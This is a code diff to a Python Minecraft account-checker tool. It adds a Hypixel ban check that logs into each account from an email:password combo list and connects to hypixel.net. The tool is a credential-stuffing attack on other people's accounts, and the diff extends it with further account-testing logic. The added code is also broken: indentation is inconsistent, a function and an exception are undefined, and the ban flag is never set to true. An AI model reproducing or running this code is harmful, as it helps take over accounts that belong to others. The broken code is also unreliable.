@@ -3,6 +3,8 @@ version = "0.10.2"
 
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta, timezone
+from minecraft import authentication
+from minecraft.networking.connection import Connection
 from multiprocessing.dummy import Pool as ThreadPool
 from os import mkdir, path, system, name, rename, _exit
 from random import choice
@@ -62,6 +64,8 @@ class Counter:
     checked = 0
     cpm = 0
     legacy_name = 0
+    banned = 0
+    unbanned = 0
 
 
 class Main:
@@ -206,6 +210,7 @@ class Main:
                         optifine = exe.submit(self.optifine, username, line).result()
                         labycape = exe.submit(self.labymod, uuid, line, username).result()
                         skyblock = exe.submit(self.skyblock, uuid).result()
+                        hbancheck = exe.submit(self.hbancheck, line).result()
                     try:
                         if mojang:
                             data.append('\nMojang Cape: True')
@@ -266,6 +271,8 @@ class Main:
                                     data.append(f'\nHypixel SkyBlock Stats: https://sky.lea.moe/stats/{uuid}')
                             else:
                                 data.append(f'\nNo Hypixel Login: True')
+                           
+                            data.append('Banned: ' + "True" if hbancheck else "False")
                     except:
                         if OxygenX.debug:
                             self.prints(f'{red}[Error] {line} \nRank/Cape Check Error: {format_exc(limit=1)}')
@@ -730,6 +737,30 @@ class Main:
                 self.writing([combo, 'EmailAccess'])
             return mailaccess
 
+    def hbancheck(self, combo):
+        email, password = combo.split(':', 1)
+        banned = False
+        if OxygenX.ban.hypixel:
+            try:
+                auth_token = authentication.AuthenticationToken()
+                auth_token.authenticate(email, password)
+                connection = Connection("hypixel.net", 25565, auth_token, )
+                connection.connect()
+                sleep(5)
+                _check_connection()
+           except InvalidState as e:
+               banned=False
+               connection.disconnect()
+           except:
+                if OxygenX.debug:
+                    self.prints(f'{red}Error Ban:\n{format_exc(limit=1)}')
+                return False
+           if banned:
+               Counter.banned += 1
+           else:
+               Counter.unbanned += 1
+           return banned
+            
     def rproxies(self):
         while self.stop_time:
             try:
